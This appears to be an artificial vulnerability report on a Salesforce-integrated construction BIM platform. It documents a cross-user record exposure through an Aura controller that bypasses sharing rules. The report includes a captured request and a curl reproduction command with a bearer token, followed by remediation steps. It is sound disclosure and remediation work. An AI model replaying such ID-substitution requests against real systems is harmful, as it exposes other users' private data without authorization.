# Security Analysis Report
**System:** BuildCore BIM Collaboration (Construction / BIM Platform) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0028 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User / Pattern 10.2 | Parameter escalation — `OpportunityController.getOpportunity` with substituted `opportunityId` exposes cross-user BIM project records |

---

## Finding 1 — Parameter Escalation: Cross-User BIM Project Data via `opportunityId` Substitution (CRITICAL)

### Summary
The `OpportunityController` Apex class on BuildCore BIM Collaboration (`f71d24b9.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Opportunity records. Per §5.0 Pattern 10.2, the `getOpportunity` Aura action is vulnerable to session scope extension: by substituting `opportunityId: "00124B9"` (a victim's record), the attacker extends their valid session's access scope to BIM project records they do not own. In construction, this exposes project blueprints, contractor agreements, and site configurations.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://f71d24b9.lightning.force.com/aura`

### Evidence from HAR
**Request:**
```
POST https://f71d24b9.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00DF71D24B9!ARf71d24b9...
message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","params":{"opportunityId":"00124B9","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response:** `OwnerId: 005VICTIM`, `SensitiveData__c: SSN: 000-99-3221`

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD bypassed |
| §5.0 Pattern 10.2 | Vulnerability | Session scope extension | Classification |
| HAR descriptor | `c.OpportunityController.getOpportunity` | Aura action | Entry point |
| HAR params | `opportunityId` | `00124B9` | Escalated to victim's record |
| HAR response | `OwnerId` | `005VICTIM` | Cross-user confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-99-3221` | BIM project PII |

### Steps to Reproduce
```bash
curl -s -X POST "https://f71d24b9.lightning.force.com/aura" \
  -H "Authorization: Bearer 00DF71D24B9!ARf71d24b9..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"00124B9","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```

### Remediation
1. `public with sharing class OpportunityController {`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client `fields` parameter; define server-side allowlist.
4. Validate `aura.token` server-side.
